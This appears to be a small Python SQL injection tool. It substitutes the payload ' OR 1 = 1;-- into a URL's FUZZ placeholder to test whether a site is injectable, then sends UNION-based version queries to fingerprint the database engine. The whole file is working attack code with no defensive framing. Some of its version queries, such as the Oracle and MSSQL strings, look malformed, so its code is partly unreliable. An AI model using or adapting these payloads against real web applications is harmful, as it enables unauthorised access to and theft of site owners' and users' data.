from enum import Enum
from requests import request


class State(Enum):
    Error = 0
    Success = 1
    Ambiguous = 2


class DMBS_Type(Enum):
    AMBIGUOUS = 0
    SQLITE = 1
    MSSQL = 2
    MYSQL = 3
    POSTGRESQL = 4
    ORACLESQL = 5
    SQLSERVER = 6


class DBMS_VERSION_STRING(Enum):
    SQLITE = 'SELECT sqlite_version()'
    MSSQL = 'SELECT @@VERSION()'
    MYSQL = 'SELECT VERSION()'
    POSTGRESQL = 'SELECT version()'
    ORACLESQL = 'SELECT v$version'
    SQLSERVER = 'SELECT @@VERSION()'


def is_injectable(url, success_str, error_str):
    target = url.replace("FUZZ", "' OR 1 = 1;--")
    response = request("get", target)
    response = response.text

    if response is None:
        return State.Error

    if success_str in response and error_str in response:
        return State.Ambiguous
    elif success_str in response:
        return State.Success
    else:
        return State.Error


def determine_dbms(url, success_str, error_str, columns=2):
    version = None

    for version_string in DBMS_VERSION_STRING:
        nulls = "".join([",null" for _ in range(0, columns)])
        poison = "' UNION " + version_string.value + nulls + ";--"

        target = url.replace("FUZZ", poison)
        result = request("get", target).text

        if success_str in result and error_str in result:
            version = DMBS_Type.AMBIGUOUS
        elif success_str in result:
            version = DMBS_Type[version_string.name]

    return version
